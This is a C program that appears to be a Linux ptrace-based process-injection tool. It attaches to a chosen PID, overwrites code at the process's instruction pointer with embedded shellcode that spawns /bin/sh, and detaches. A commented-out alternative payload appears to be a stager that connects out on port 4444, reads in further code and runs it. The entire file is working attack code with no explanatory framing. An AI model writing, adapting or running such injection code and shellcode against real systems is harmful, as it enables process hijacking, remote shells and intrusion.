#include <stdio.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <stdint.h>
#include <wait.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    pid_t pid = 2124;
    int v = 0;
    for (int i=0; i < argc; i++) {
        if (strcmp(argv[i],"-h") == 0) {
            printf("Help: ./a.out -p 18893 -v 2\n");
            return 0;
        } else if (strcmp(argv[i],"-p") == 0) {
            i++;
            pid = (pid_t)atoi(argv[i]);
        } else if (strcmp(argv[i],"-v") == 0) {
            i++;
            v = atoi(argv[i]);
            if (v < 0 || v > 2) {
                printf("Error: vebosity must be >= 0 and <= 2\n");
                return 1;
            }
        }
    }

    unsigned char *sc = 
    "\x50\x48\x31\xd2\x48\x31\xf6\x48"
    "\xbb\x2f\x62\x69\x6e\x2f\x2f\x73"
    "\x68\x53\x54\x5f\xb0\x3b\x0f\x05";
    /*unsigned char *sc =
        "\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
        "\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x4e"
        "\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
        "\x5e\x0f\x05\x48\x85\xc0\x78\x38\x48\x97\x48\xc7\xc1\x02"
        "\x00\x11\x5c\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f"
        "\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a"
        "\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05"
        "\x59\x59\x5f\x48\x85\xc0\x79\xca\x6a\x3c\x58\x6a\x01\x5f"
        "\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff"
        "\xe6";*/
    size_t sclen = 0;

    while (sc[sclen] != '\0') {
        sclen++;
    }
    //sclen++;

    if (v > 0)
        printf("Attaching to PID: %d\n",pid);
    if ((ptrace(PTRACE_ATTACH, pid, NULL,NULL)) != 0) {
        if (v > 0)
            printf("Error: Problems Attaching\n");
        return 1;
    }
    int waitxxx;
    if (waitpid(pid, &waitxxx, WUNTRACED) != pid) {
        if (v > 0)
            printf("Error: Waiting proc %d\n",pid);
        return 1;
    }
    
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) != 0) {
        if (v > 0)
            printf("Error: Problems Saving Regs\n");
        return 0;
    }

    uint32_t *s = (uint32_t *) sc;
    uint32_t *d = (uint32_t *) regs.rip;
    if (v > 0)
        printf ("Start injecting shellcode at %p\n", d);
    for (int i=0; i < sclen; i+=4, s++,d++) {
        uint32_t *xs = s;
        unsigned char xp = *s;
        if (v > 1)
            printf("Writting from %p - %x to %p\n",xs,*s,d);
	    if (ptrace(PTRACE_POKETEXT, pid, d, *s) != 0) {
            if (v > 0)
                printf("Error: Problems writting intruction\n");
            if (v > 1)
                printf("+ From %p - %x\n",xs,xp);
            return 1;
        }
    }
    if (v > 0)
        printf("%d Bytes written\n",(int)sclen);

    regs.rip +=2;
    if (v > 0)
        printf("Continue from %p\n",(void *)regs.rip);
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) != 0) {
        if (v > 0)
            printf("Error: Problems setting regs.\n");
        return 1;
    }

    //ptrace(PTRACE_CONT, pid, NULL, NULL);
    if (v > 0)
        printf("Deataching from PID: %d\n",pid);
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) != 0) {
        if (v > 0)
            printf("Error: Problems deataching regs.\n");
        return 1;
    }
    return 0;
}
